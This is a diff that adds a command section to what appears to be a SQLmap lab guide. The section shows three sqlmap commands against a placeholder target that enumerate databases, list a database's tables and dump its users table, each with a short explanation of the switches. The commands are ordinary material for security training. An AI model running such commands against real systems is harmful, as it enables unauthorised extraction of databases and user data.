@@ -1488,6 +1488,37 @@ This lab covers the fundamentals of **SQLmap**, an open-source penetration testi
 *   **Vulnerability Detection:** SQLmap sends a massive array of specialized payloads to targeted parameters (via GET, POST, or cookies) to monitor how the server responds, automatically identifying weak input validation rules.
 *   **Database Footprinting (Enumeration):** Once an injection vector is confirmed, SQLmap bypasses manually constructed queries to enumerate structural data maps, extracting system banners, database names, schemas, and tables.
 *   **Data Extraction (Dumping):** The tool automates the recursive extraction of data records, converting raw tabular database elements into scannable text files or downloading encrypted password hashes locally.
+---
+---
+## 🛠️ SQLmap Command Playbook & Core Switches
+
+SQLmap replaces manual payload crafting with automated heuristics, supporting multiple injection techniques (such as boolean-based blind, time-based blind, error-based, and UNION query) across dozens of database backends.
+
+### 🔍 1. Basic Target Probing & Database Enumeration
+Used to verify if a specific GET parameter (like `cat=1`) is vulnerable and list all available database names:
+```bash
+sqlmap -u "http://TARGET_IP/gallery.php?cat=1" --dbs
+```
+*   **`-u`**: Specifies the target URL containing the parameter to test.
+*   **`--dbs`**: Instructs the tool to enumerate all available database management system databases once an injection point is confirmed.
+
+### 📂 2. Table and Column Extraction
+Used to drill down into a specific database to extract its internal table schemas:
+```bash
+sqlmap -u "http://TARGET_IP/gallery.php?cat=1" -D bloodbank --tables
+```
+*   **`-D`**: Selects a specific database target name.
+*   **`--tables`**: Lists all tables present within that chosen database.
+
+### 💾 3. Data Dumping
+Used to extract all records and rows from a targeted table automatically:
+```bash
+sqlmap -u "http://TARGET_IP/gallery.php?cat=1" -D bloodbank -T users --dump
+```
+*   **`-T`**: Specifies the precise database table name.
+*   **`--dump`**: Retrieves and exports the table entries and records locally.
+
+---
 
 
 
